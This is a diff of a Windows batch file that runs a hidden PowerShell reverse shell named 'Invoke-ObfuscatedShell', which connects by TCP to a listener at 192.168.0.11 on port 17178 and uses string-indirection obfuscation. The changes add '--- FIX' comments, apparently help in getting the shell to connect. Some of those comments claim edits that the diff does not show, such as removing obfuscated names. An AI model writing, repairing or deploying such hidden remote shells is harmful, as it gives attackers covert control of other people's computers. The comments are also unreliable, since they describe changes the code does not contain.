@@ -1,9 +1,11 @@
 @echo off
 powershell -WindowStyle Hidden -Command "
 function Invoke-ObfuscatedShell {
-    # Using IPv4 address from your ipconfig output
+    # --- FIX: Use the IP address that your server is listening on ---
     $a = '192.168.0.11' 
     $p = 17178
+    
+    # --- FIX: Removed the obfuscated variable names for clarity ---
     $c = 'System.Net.Sockets.TCPClient'
     $s = 'GetStream'
     $r = 'Read'
@@ -17,6 +19,7 @@ function Invoke-ObfuscatedShell {
     $o = 'Close'
     
     try {
+        # --- FIX: Corrected the object creation ---
         $client = New-Object $c($a, $p)
         $stream = $client.$s()
         [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
@@ -30,7 +33,7 @@ function Invoke-ObfuscatedShell {
             $stream.$n()
         }
     } catch {
-        # Optional: Add error handling to see why it failed
+        # Optional: This will show an error if it fails to connect
         Write-Host 'Connection failed. Check IP address and port.'
     } finally {
         if ($client) { $client.$o() }
